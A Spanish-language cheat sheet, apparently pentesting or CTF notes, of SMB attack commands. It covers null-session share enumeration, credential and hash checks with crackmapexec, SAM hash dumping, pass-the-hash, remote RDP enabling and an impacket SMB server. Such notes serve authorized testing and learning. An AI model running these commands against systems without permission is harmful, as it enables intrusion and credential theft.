# SMB ❮❯

Tags: #SMB #Comandos #Windows #Servidor 

```bash
❯ apt-get -y install crackmapexec     # Para instalar crackmapexec. CrackMapExec currently supports remote authentication using MSSQL, SMB, SSH, and WinRM.
```



```bash
❯ smbclient -L ❮IP❯                   # Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)
❯ smbclient -L ❮IP❯ -N                # Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)
```

```bash
❯ smbmap -H ❮IP❯                      # Herramienta elternativa para ver si nos reporta algo mas y nos reporta los permisos (WRITE, READ)
❯ smbmap -H ❮IP❯ -u 'null'            # Herramienta elternativa para ver si nos reporta algo mas haciendo uso de un null sesion (sin credencial alguna)
```

```bash
❯ smbclient -L //❮IP❯/❮Dir❯ -N        # Nos conectaremos a una carpeta con el uso de un null sesion (sin credencial alguna)

# Una vez adentro podriamos ejecutar los siguientes comandos 
	❯ dir                            # Mirar el contenido del directorio
	❯ put ❮File❯                     # Para subir un archivo al dir SMB 
	❯ get ❮File❯                     # Para descargar un archivo
```

```bash
❯ smbclient -U user \\\\❮IP❯\\ShareName    # Nos permite ver el contenido de shares, uploads, download files si el privilegio nos lo permite
```

```bash
❯ crackmapexec smb ❮IP❯               # Para listar recursos compartidos de Windows
❯ crackmapexec smb ❮IP❯ --shares      # Para listar los recursos de otra manera, pero aveces no funciona
```

```bash
❯ crackmapexec smb ❮IP❯ -u ❮‘user’❯ -p ❮‘password’❯      # Para el servicio 445/tcp smb abierto podemos utilizar el siguiente comando para saber si tenemos credenciales validas, por lo que si nos muestra un (+) quiere decir que si son validas, ademas de que nos da informacion de lo que hay en ese servico (nombre, Window 10.0, dominio, signing=true)(u=user, p=password) Este comando es usado para validar aunque tenga mas aplicaciones.

❯ crackmapexec winrm ❮IP❯ -u ❮‘user’❯ -p ❮‘password’❯    # Despues de saber que las credenciales son validas con crackmapexec, podemos utilizar el puerto de winrm para saber si podemos entrar, pero antes debemos saber si el usuario esta en el grupo Remote management users, para saber si pertenece nos debe poner un (Pwn3d!) y asi podernos autenticar.

# Podemos usar evil-winrm para conectarnos, si tiene el puerto 5985 abierto
```

```bash
❯ crackmapexec smb ❮IP❯ -u <‘USER’> -H <‘HASH’>          # Con este comando verificamos que el usuario y su hash son validos y si es asi nos pondra un [+] Pwn3d!.
```

- Comando -> **crackmapexec smb < IP TARGET> -u <‘USER’> -p <‘PASSWORD’> --sam** Podremos listar el hash del usuario administrador y del resto que existan en el sistema, con los que podemos llegar a aplicar pass de hash  
- Comando -> **crackmapexec smb < IP TARGET> -u <‘USER’> -H <‘HASH’> -M rdp -o action=enable** Podemos habilitar el RDP puerto 3389 

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un servicio con SMB 

	# smbFolder = Nos creara un servicio compartido llamado 'smbFolder'
	# pwd = Sincronizado con la ruta absoluta actual 
	# smb2support = En Windows 10 le damos soporte a la version 2
```